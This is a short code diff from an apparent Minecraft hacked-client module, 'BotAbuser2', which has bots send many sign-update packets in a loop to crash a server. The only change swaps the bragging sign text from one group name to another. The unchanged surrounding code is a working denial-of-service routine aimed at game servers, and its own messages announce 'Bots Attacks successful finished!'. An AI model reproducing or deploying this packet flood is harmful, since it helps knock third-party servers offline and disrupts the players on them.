@@ -18,7 +18,7 @@ public class BotAbuser2 implements BotCrasher {
         msgHelper.sendMessage("Bots Starting crashing with &f" + getName(), true);
 
         for (int i = 0; i < packets; i++) {
-            botsRep.sendPacket(new ServerboundSignUpdatePacket(Vector3i.from(mc.player.getBlockX(), mc.player.getBlockY(), mc.player.getBlockZ()), new String[]{"{text:xynis on top}", "{text:xynis is the best}", "{text:xynis on top}", "{text:xynis is the best}"}, true), true);
+            botsRep.sendPacket(new ServerboundSignUpdatePacket(Vector3i.from(mc.player.getBlockX(), mc.player.getBlockY(), mc.player.getBlockZ()), new String[]{"{text:redsignal on top}", "{text:redsignal is the best}", "{text:redsignal on top}", "{text:redsignal is the best}"}, true), true);
         }
 
         msgHelper.sendMessage("Bots Attacks &asuccessful &7finished!", true);
